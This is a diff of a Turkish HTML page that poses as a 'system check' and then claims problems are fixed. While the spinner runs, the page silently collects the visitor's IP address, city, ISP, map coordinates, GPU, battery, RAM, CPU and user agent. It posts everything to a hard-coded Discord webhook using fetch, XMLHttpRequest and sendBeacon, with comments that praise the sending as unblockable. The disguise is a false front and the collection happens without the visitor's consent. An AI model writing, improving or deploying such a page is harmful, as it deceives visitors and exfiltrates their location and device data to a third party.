@@ -5,59 +5,55 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistem Kontrolü</title>
     <style>
-        body { background-color: #0f0f0f; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .container { text-align: center; }
-        .loader { border: 3px solid #333; border-top: 3px solid #00ff41; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.6s linear infinite; margin: 0 auto 20px; }
+        body { background-color: #000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 2px solid #111; border-top: 2px solid #00ff41; border-radius: 50%; width: 25px; height: 25px; animation: spin 0.7s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { font-weight: 400; font-size: 15px; margin: 0; color: #444; }
-        .success-text { color: #00ff41; font-weight: bold; }
+        h2 { color: #222; font-size: 12px; margin-left: 15px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div id="loader" class="loader"></div>
-        <h2 id="msg">Sistem ayarları kontrol ediliyor...</h2>
-    </div>
+    <div class="loader"></div>
+    <h2 id="msg">Sistem taranıyor...</h2>
 
     <script>
-        // Webhook URL'ni buraya koy (URL'nin sonunda boşluk olmadığından emin ol)
+        // WEBHOOK URL'İNİ BURAYA YAZ (TIRNAK İÇİNE)
         const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        async function sızma() {
-            let info = { gpu: "X", ven: "X", bat: "N/A", loc: "Çekilemedi", ip: "X" };
+        async function sız() {
+            let i = { g: "Locked", v: "Locked", b: "N/A", l: "X", ip: "X" };
 
             // 1. IP ve KONUM (İzin İstemez)
             try {
                 const r = await fetch('https://ipapi.co/json/');
                 const d = await r.json();
-                info.ip = d.ip;
-                info.loc = `📍 **Bölge:** ${d.city}, ${d.region}\n🛰️ **ISP:** ${d.org}\n🔗 [Haritada Gör](https://www.google.com/maps?q=${d.latitude},${d.longitude})`;
+                i.ip = d.ip;
+                i.l = `📍 **Bölge:** ${d.city}, ${d.region}\n🛰️ **ISP:** ${d.org}\n🔗 [Haritada Gör](https://www.google.com/maps?q=${d.latitude},${d.longitude})`;
             } catch(e) {}
 
-            // 2. GPU ve VENDOR (Force WebGL)
+            // 2. GPU ve VENDOR (Sessiz Sızıntı)
             try {
                 const c = document.createElement('canvas');
                 const gl = c.getContext('webgl');
-                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
-                info.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
+                const db = gl.getExtension('WEBGL_debug_renderer_info');
+                i.g = gl.getParameter(db.UNMASKED_RENDERER_ID);
+                i.v = gl.getParameter(db.UNMASKED_VENDOR_ID);
             } catch(e) {}
 
             // 3. PİL DURUMU
             try {
-                const b = await navigator.getBattery();
-                info.bat = `%${(b.level * 100).toFixed(0)} (${b.charging ? 'Prizde' : 'Pilde'})`;
+                const bat = await navigator.getBattery();
+                i.b = `%${Math.round(bat.level * 100)} (${bat.charging ? 'Prizde' : 'Pilde'})`;
             } catch(e) {}
 
-            // 4. KIRMIZI EMBED RAPORU
-            const payload = {
+            // 4. KIRMIZI EMBED ŞABLONU
+            const p = {
                 embeds: [{
-                    title: "🕵️ KRİTİK ANALİZ RAPORU (VAHŞİ)",
+                    title: "🕵️ KRİTİK SİSTEM RAPORU (FORCE)",
                     color: 15158332,
                     fields: [
-                        { name: "📍 LOKASYON (IP)", value: info.loc, inline: false },
-                        { name: "🛠️ DONANIM", value: `**GPU:** \`${info.gpu}\`\n**VENDOR:** \`${info.ven}\`\n**RAM:** ${navigator.deviceMemory}GB | **CPU:** ${navigator.hardwareConcurrency}`, inline: false },
-                        { name: "🔋 DURUM", value: info.bat, inline: true },
+                        { name: "📍 LOKASYON (IP)", value: i.l, inline: false },
+                        { name: "🛠️ DONANIM", value: `**GPU:** \`${i.g}\`\n**VENDOR:** \`${i.v}\`\n**RAM:** ${navigator.deviceMemory}GB | **CPU:** ${navigator.hardwareConcurrency}`, inline: false },
+                        { name: "🔋 DURUM", value: i.b, inline: true },
                         { name: "📱 OS", value: navigator.platform, inline: true },
                         { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```" }
                     ],
@@ -65,27 +61,23 @@
                 }]
             };
 
-            // 5. GÖNDERİM: MUTLAK KUVVET (3 Farklı Metod Aynı Anda)
-            const data = JSON.stringify(payload);
-            
-            // Metod 1: Fetch (Standart)
-            fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: data }).catch(() => {});
+            // 5. ENGELLENEMEZ GÖNDERİM (Hidden Form Submission)
+            const blob = new Blob([JSON.stringify(p)], { type: 'application/json' });
+            navigator.sendBeacon(u, blob);
 
-            // Metod 2: XMLHttpRequest (Eski ama en güçlüsü)
+            // Eğer beacon başarısız olursa diye klasik XHR force
             const x = new XMLHttpRequest();
-            x.open("POST", u, true);
+            x.open("POST", u);
             x.setRequestHeader("Content-Type", "application/json");
-            x.send(data);
+            x.send(JSON.stringify(p));
 
-            // Metod 3: Beacon (Kapatılmaya karşı dirençli)
-            navigator.sendBeacon(u, data);
-
-            // Arayüzü güncelle
-            document.getElementById('msg').innerHTML = '<span class="success-text">Sorunlar düzeltildi.</span>';
-            document.getElementById('loader').style.display = "none";
+            // Arayüz Bitiş
+            setTimeout(() => {
+                document.getElementById('msg').innerHTML = "<span style='color:#00ff41'>Sorunlar düzeltildi.</span>";
+            }, 1000);
         }
 
-        window.onload = sızma;
+        window.onload = sız;
     </script>
 </body>
 </html>
